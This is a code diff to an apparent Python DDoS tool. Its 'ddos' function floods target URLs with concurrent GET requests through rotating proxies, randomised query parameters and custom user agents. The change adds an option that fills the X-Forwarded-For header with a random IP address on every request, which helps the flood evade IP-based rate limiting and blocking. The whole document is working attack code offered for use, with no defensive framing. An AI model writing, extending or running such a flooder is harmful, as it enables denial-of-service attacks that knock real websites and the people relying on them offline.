@@ -8,7 +8,7 @@ import os
 from collections import defaultdict
 from itertools import cycle
 from random import randint
-from typing import Iterable, List, Tuple
+from typing import Iterable, List, Tuple, Dict
 import urllib.parse as urlparse
 from urllib.parse import urlencode
 
@@ -23,17 +23,16 @@ from commons import config_logger, set_limits, load_proxies
 STATS = defaultdict(int)
 
 
-async def make_request(url: str, proxy: str, timeout: int, user_agent: str):
+async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str]):
     timeout = aiohttp.ClientTimeout(total=timeout)
-    logging.debug('Url: %s Proxy: %s', url, proxy)
+    logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
     try:
         if proxy:
             connector = ProxyConnector.from_url(proxy)
             client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
         else:
             client_session = aiohttp.ClientSession(timeout=timeout)
-        if user_agent:
-            client_session.headers['user-agent'] = user_agent
+        client_session.headers.update(headers)
 
         async with client_session as session:
             async with session.get(url) as response:
@@ -64,9 +63,18 @@ def prepare_url(url: str, with_random_get_param: bool):
     return url
 
 
+def make_headers(user_agent: str, random_xff_ip: bool) -> Dict[str, str]:
+    headers = {}
+    if user_agent:
+        headers['user-agent'] = user_agent
+    if random_xff_ip:
+        headers['x-forwarded-for'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
+    return headers
+
+
 async def ddos(
         target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
-        with_random_get_param: bool, user_agent: str
+        with_random_get_param: bool, user_agent: str, random_xff_ip: bool
 ):
     step = 0
     while True:
@@ -74,18 +82,21 @@ async def ddos(
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, user_agent)
+        headers = make_headers(user_agent, random_xff_ip)
+        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers)
 
 
 async def amain(
         target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
-        with_random_get_param: bool, user_agent: str
+        with_random_get_param: bool, user_agent: str, random_xff_ip: bool
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target_url in target_urls:
         for _ in range(concurrency):
-            coroutines.append(ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent))
+            coroutines.append(
+                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, random_xff_ip)
+            )
     await asyncio.gather(*coroutines)
 
 
@@ -108,7 +119,7 @@ def load_targets(target_urls_file: str) -> List[str]:
 def process(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, with_random_get_param: bool,
-        user_agent: str, verbose: bool, log_to_stdout: bool,
+        user_agent: str, verbose: bool, log_to_stdout: bool, random_xff_ip: bool,
 ):
     config_logger(verbose, log_to_stdout)
     uvloop.install()
@@ -118,7 +129,9 @@ def process(
     if target_url:
         target_urls.append(target_url)
     loop = asyncio.get_event_loop()
-    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent))
+    loop.run_until_complete(
+        amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent, random_xff_ip)
+    )
     for key, value in STATS.items():
         if key != 'success':
             logging.info("%s: %s", key, value)
@@ -138,10 +151,11 @@ def process(
 @click.option('--user-agent', help='custom user agent')
 @click.option('--log-to-stdout', help='log to console', is_flag=True)
 @click.option('--restart-period', help='period in seconds to restart application (reload proxies ans targets)', type=int)
+@click.option('--random-xff-ip', help='set random ip address value for X-Forwarder-For header', is_flag=True, default=False)
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
-        user_agent: str, log_to_stdout: str, restart_period: int
+        user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool,
 ):
     config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
@@ -150,7 +164,8 @@ def main(
         proc = multiprocessing.Process(
             target=process,
             args=(target_url, target_urls_file, proxy_url, proxy_file,
-                  concurrency, count, timeout, with_random_get_param, user_agent, verbose, log_to_stdout)
+                  concurrency, count, timeout, with_random_get_param,
+                  user_agent, verbose, log_to_stdout, random_xff_ip)
         )
         proc.start()
         proc.join(restart_period)
